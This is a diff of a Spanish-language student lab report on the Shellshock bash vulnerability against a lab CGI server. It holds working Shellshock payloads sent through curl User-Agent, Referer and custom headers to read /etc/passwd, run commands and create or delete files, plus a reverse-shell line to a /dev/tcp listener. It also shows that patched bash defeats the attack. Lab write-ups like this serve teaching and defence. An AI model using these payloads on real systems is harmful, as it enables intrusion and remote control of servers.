@@ -103,29 +103,46 @@ SCRIPT_NAME=/cgi-bin/getenv.cgi
 
 ### curl
 
-`Include Headers`
+Se ha observado lo siguiente sobre las opciones de `curl`:
+
+- Opción "Include Headers" (`-v`): Añade información sobre las cabeceras de la respuesta.  
 ```bash
 curl -v 10.9.0.80/cgi-bin/getenv.cgi
 ```
+```bash
+> GET /cgi-bin/getenv.cgi HTTP/1.1
+> Host: 10.9.0.80
+> User-Agent: curl/7.68.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Mon, 26 Sep 2022 20:51:11 GMT
+< Server: Apache/2.4.41 (Ubuntu)
+< Content-Length: 13
+< Content-Type: text/plain
+< 
+...
+```
 
-`HTTP_USER_AGENT`
+- Opción "UserAgent" (`-A`): Añade un campo de agente de usuario a la cabecera. Además, define una variable de entorno `HTTP_USER_AGENT`.
 ```bash
 curl -A "my data" -v 10.9.0.80/cgi-bin/getenv.cgi
 ```
 
-`HTTP_REFERER`
+- Opción "Referer" (`-e`): Añade un campo que incluye la URL de la página web que redirigió la petición al servidor. Además, define una variable de entorno `HTTP_REFERER`
 ```bash
 curl -e "my data" -v 10.9.0.80/cgi-bin/getenv.cgi
 ```
 
-`HTTP_{CUSTOM_HEADER}`
+- Opción "Custom Header" (`-H`): Permite añadir una cabecera personalizada y asociar un valor. Además, define una variable de entorno `HTTP_[CUSTOM_HEADER]`, donde `[CUSTOM_HEADER]` es la clave de la cabecera en mayúsculas.
 ```bash
 curl -H "AAAAAA: BBBBBB" -v 10.9.0.80/cgi-bin/getenv.cgi
 ```
 
 ## Tarea 3
 
-Para lanzar el ataque Shellshock a través del CGI vulnerable se añade una cabecera `Content_type`. La salida del código extra aparecerá en el contenido del mensaje de respuesta del servidor
+Para lanzar el ataque Shellshock a través del CGI vulnerable se añade una cabecera `ContentType`. La salida del código extra aparecerá en el contenido del mensaje de respuesta del servidor, ya que se exportó una declaración de función vulnerable, y como el CGI crea un shell hijo, entonces se ejecutará el código extra.
 
 ### Mostrar `/etc/passwd`
 ```bash
@@ -155,7 +172,7 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 
 ### user ID del proceso
 ```bash
-curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/id" 10.9.0.80/cgi-bin/getenv.cgi
+curl -e "() { :; }; echo Content_type: text/plain; echo; /bin/id" 10.9.0.80/cgi-bin/getenv.cgi
 ```
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -163,23 +180,25 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Crear fichero en `/tmp`
 ```bash
-curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/touch /tmp/sec" 10.9.0.80/cgi-bin/getenv.cgi
+curl -H "foo: () { :; }; echo Content_type: text/plain; echo; /bin/touch /tmp/sec" 10.9.0.80/cgi-bin/getenv.cgi
 ```
 
 ### Borrar fichero en `/tmp`
 ```bash
-curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/rm /tmp/sec" 10.9.0.80/cgi-bin/getenv.cgi
+curl -H "foo: () { :; }; echo Content_type: text/plain; echo; /bin/rm /tmp/sec" 10.9.0.80/cgi-bin/getenv.cgi
 ```
 
 ### Pregunta 1
 No es posible, ya que el usuario que ejecuta el script del CGI es `www-data`, que no tiene privilegios de root. Se puede observar en el resultado de la [Tarea 3b](#user-id-del-proceso)
 
 ### Pregunta 2
-No se puede, porque la codificación de la query string no admite espacios ni carácteres especiales. En su lugar los codifica con un porcentaje y un número, por ejemplo el espacio, cuya codificación es `%20`
+No se puede, porque la codificación de la query string no admite espacios ni carácteres especiales. En su lugar los codifica con un porcentaje y un número, por ejemplo el espacio, cuya codificación es `%20`. Por ello, si se quiere añadir una definición de función en la query de la URL, no puede contener espacios, y si los tiene, quedarán codificados por el formato `url-encode`, por lo que la definición de función en la variable de entorno exportada no se interpretará como se esperaba.
 
 ```bash	
 root@4f8f7c1d55f1:/$ curl -G "10.9.0.80/cgi-bin/getenv.cgi" --data-urlencode "() { :; }; echo Content_type: text/plain; echo; echo hola"
 ```
+
+El resultado de la codificación queda reflejado en la variable de entorno `QUERY_STRING`:
 
 ```bash
 QUERY_STRING=%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20echo%20hola
@@ -201,6 +220,17 @@ curl -A '() { :; }; /bin/bash -i >& /dev/tcp/10.0.2.4/4444 0>&1' 10.9.0.80/cgi-b
 ```
 
 Hemos usado el script [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) para analizar dentro de la maquina victima posibles vulnerabilidades para escalar privilegios y obtener una shell con permisos de root.
+
+## Tarea 5
+
+Se ha realizado de nuevo la tarea 3, cambiando el intérprete del script del CGI al bash parcheado. Para ello, se ha cambiado el shebang del script CGI vul.cgi en la máquina víctima a `#!/bin/bash`.
+
+Se ha observado que la respuesta a una petición que incluye contenido que explota la vulnerabilidad ya no tiene efecto, ya que las definiciones de función se parsean correctamente e ignoran cadenas mal formadas. A continuación se muestra el resultado de una petición a ambos scripts:
+
+```
+root@4f8f7c1d55f1:/# curl -H "foo: () { :; }; echo Content_type: text/plain; echo; /bin/ls -l" 10.9.0.80/cgi-bin/vul.cgi
+Hello World
+```
 
 ## Referencias 
 
